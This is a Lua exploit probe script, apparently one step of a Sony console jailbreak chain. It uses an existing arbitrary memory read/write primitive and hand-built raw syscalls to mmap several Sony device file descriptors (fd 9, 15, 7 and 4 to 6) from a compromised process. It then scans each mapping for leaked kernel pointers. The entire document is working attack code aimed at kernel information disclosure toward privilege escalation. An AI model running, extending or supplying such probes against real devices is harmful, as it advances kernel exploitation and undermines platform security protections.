-- CRASH_CLASS: LOW
-- PROBE 115a: deep mmap scan of fd 9 (Sony type 0x9000)
--
-- 114a showed fd 9 supports mmap from child thread.
-- This probe mmaps fd 9 from MAIN thread (make_syscall returns full 64-bit)
-- and scans the mapping for kernel pointers.
--
-- Also try fd 15 (same 0x9000 type) and fd 7 (0xB000 type).

print("=== PROBE 115a: FD 9 MMAP DEEP SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local pid=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print("pid="..pid)

local sc_mmap = mk(477)

-- ============================================================
print("")
print("--- A: MMAP fd 9 (Sony 0x9000 type) from main thread ---")
-- mmap(NULL, size, PROT_READ, MAP_SHARED, fd, offset)
-- Try different sizes

local sizes = {0x4000, 0x10000, 0x40000, 0x100000}
local mapped_addr = nil
local mapped_size = 0

for _, sz in ipairs(sizes) do
    local ok, addr = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(1),  -- PROT_READ=1
            uint64(1), uint64(9), uint64(0))               -- MAP_SHARED=1, fd=9
    end)
    if ok and addr then
        local h, l = get_hi_lo(addr)
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        -- Check if it's a valid address (not MAP_FAILED = -1)
        if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
            mapped_addr = addr
            mapped_size = sz
            print(string.format("  mmap(fd=9, size=0x%X): addr=%s *** SUCCESS ***", sz, fmt_ptr(addr)))
            break
        else
            print(string.format("  mmap(fd=9, size=0x%X): MAP_FAILED", sz))
        end
    else
        print(string.format("  mmap(fd=9, size=0x%X): pcall failed", sz))
    end
end

if mapped_addr then
    local MA = N(mapped_addr)
    print(string.format("  mapped at 0x%X, scanning %d bytes...", MA, mapped_size))

    -- First: try reading a few bytes to make sure it's readable
    local first_ok, first_val = pcall(function() return memory.read_dword(MA) end)
    if not first_ok then
        print("  *** MAPPING NOT READABLE (crash on first read) ***")
    else
        print(string.format("  first dword: 0x%X", N(first_val)))

        -- Scan for kernel pointers
        local kptr_count = 0
        local readable_count = 0
        local scan_limit = math.min(mapped_size, 0x40000)  -- 256KB max scan

        for off=0,scan_limit-8,8 do
            local ok2, val = pcall(function() return memory.read_qword(MA+off) end)
            if ok2 and val then
                readable_count = readable_count + 1
                if is_kptr(val) then
                    kptr_count = kptr_count + 1
                    print(string.format("  *** KPTR at +0x%X: %s ***", off, fmt_ptr(val)))
                    if kptr_count >= 20 then
                        print("  (capped at 20)")
                        break
                    end
                end
            else
                -- Hit unreadable page
                if readable_count > 0 then
                    print(string.format("  unreadable at +0x%X (after %d readable qwords)", off, readable_count))
                end
                break
            end
        end

        print(string.format("  scanned %d qwords, found %d kernel pointers", readable_count, kptr_count))

        if kptr_count == 0 then
            -- Dump first 256 bytes for analysis
            print("  first 256 bytes of mapping:")
            for off=0,0xF8,8 do
                local val = rq(MA+off)
                if val then
                    print(string.format("    +0x%02X: %s", off, fmt_ptr(val)))
                end
            end
        end
    end
else
    print("  fd 9 mmap FAILED from main thread")

    -- Try PROT_READ|PROT_WRITE
    print("  trying PROT_RW...")
    local ok, addr = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),  -- PROT_RW=3
            uint64(1), uint64(9), uint64(0))
    end)
    if ok and addr then
        local h,l = get_hi_lo(addr)
        if h<0 then h=h+0x100000000 end
        if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
            mapped_addr = addr
            mapped_size = 0x4000
            print(string.format("  PROT_RW mmap: addr=%s *** SUCCESS ***", fmt_ptr(addr)))
        else
            print("  PROT_RW: MAP_FAILED")
        end
    end

    -- Try MAP_PRIVATE
    if not mapped_addr then
        print("  trying MAP_PRIVATE...")
        local ok2, addr2 = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
                uint64(2), uint64(9), uint64(0))  -- MAP_PRIVATE=2
        end)
        if ok2 and addr2 then
            local h,l = get_hi_lo(addr2)
            if h<0 then h=h+0x100000000 end
            if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
                mapped_addr = addr2
                mapped_size = 0x4000
                print(string.format("  MAP_PRIVATE: addr=%s *** SUCCESS ***", fmt_ptr(addr2)))
            else
                print("  MAP_PRIVATE: MAP_FAILED")
            end
        end
    end
end

-- ============================================================
print("")
print("--- B: MMAP fd 15 (Sony 0x9000 type, rwx perms) ---")
local ok15, addr15 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(15), uint64(0))
end)
if ok15 and addr15 then
    local h,l = get_hi_lo(addr15)
    if h<0 then h=h+0x100000000 end
    if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
        print(string.format("  fd 15 mmap: addr=%s *** SUCCESS ***", fmt_ptr(addr15)))
        local MA15 = N(addr15)
        local ok_r, fv = pcall(function() return memory.read_dword(MA15) end)
        if ok_r then
            print(string.format("  first dword: 0x%X", N(fv)))
            local kp = 0
            for off=0,0x3FF8,8 do
                local ok3, val = pcall(function() return memory.read_qword(MA15+off) end)
                if ok3 and val and is_kptr(val) then
                    kp = kp + 1
                    print(string.format("    *** KPTR +0x%X: %s ***", off, fmt_ptr(val)))
                    if kp>=10 then break end
                end
            end
            print(string.format("  fd 15 kernel pointers: %d", kp))
        else
            print("  not readable")
        end
    else
        print("  fd 15 mmap: MAP_FAILED")
    end
else
    print("  fd 15 mmap: pcall failed")
end

-- ============================================================
print("")
print("--- C: MMAP fd 7 (Sony 0xB000 type) ---")
local ok7, addr7 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(7), uint64(0))
end)
if ok7 and addr7 then
    local h,l = get_hi_lo(addr7)
    if h<0 then h=h+0x100000000 end
    if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
        print(string.format("  fd 7 mmap: addr=%s *** SUCCESS ***", fmt_ptr(addr7)))
        local MA7 = N(addr7)
        local ok_r, fv = pcall(function() return memory.read_dword(MA7) end)
        if ok_r then
            print(string.format("  first dword: 0x%X", N(fv)))
            local kp = 0
            for off=0,0x3FF8,8 do
                local ok3, val = pcall(function() return memory.read_qword(MA7+off) end)
                if ok3 and val and is_kptr(val) then
                    kp = kp + 1
                    print(string.format("    *** KPTR +0x%X: %s ***", off, fmt_ptr(val)))
                    if kp>=10 then break end
                end
            end
            print(string.format("  fd 7 kernel pointers: %d", kp))
        else
            print("  not readable")
        end
    else
        print("  fd 7 mmap: MAP_FAILED")
    end
else
    print("  fd 7 mmap: pcall failed")
end

-- ============================================================
print("")
print("--- D: MMAP fd 4,5,6 (CHR devices with rwx perms) ---")
for _, fd in ipairs({4, 5, 6}) do
    local okx, addrx = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(fd), uint64(0))
    end)
    if okx and addrx then
        local h,l = get_hi_lo(addrx)
        if h<0 then h=h+0x100000000 end
        if not (h==0xFFFFFFFF and l==0xFFFFFFFF) then
            print(string.format("  fd %d mmap: addr=%s *** SUCCESS ***", fd, fmt_ptr(addrx)))
            local MAx = N(addrx)
            local ok_r, fv = pcall(function() return memory.read_dword(MAx) end)
            if ok_r then
                print(string.format("    first dword: 0x%X", N(fv)))
                local kp = 0
                for off=0,0x3FF8,8 do
                    local ok3, val = pcall(function() return memory.read_qword(MAx+off) end)
                    if ok3 and val and is_kptr(val) then
                        kp = kp + 1
                        print(string.format("    *** KPTR +0x%X: %s ***", off, fmt_ptr(val)))
                        if kp>=10 then break end
                    end
                end
                print(string.format("    kernel pointers: %d", kp))
            else
                print("    not readable")
            end
        else
            print(string.format("  fd %d mmap: MAP_FAILED", fd))
        end
    else
        print(string.format("  fd %d mmap: pcall failed", fd))
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 115a COMPLETE ===")
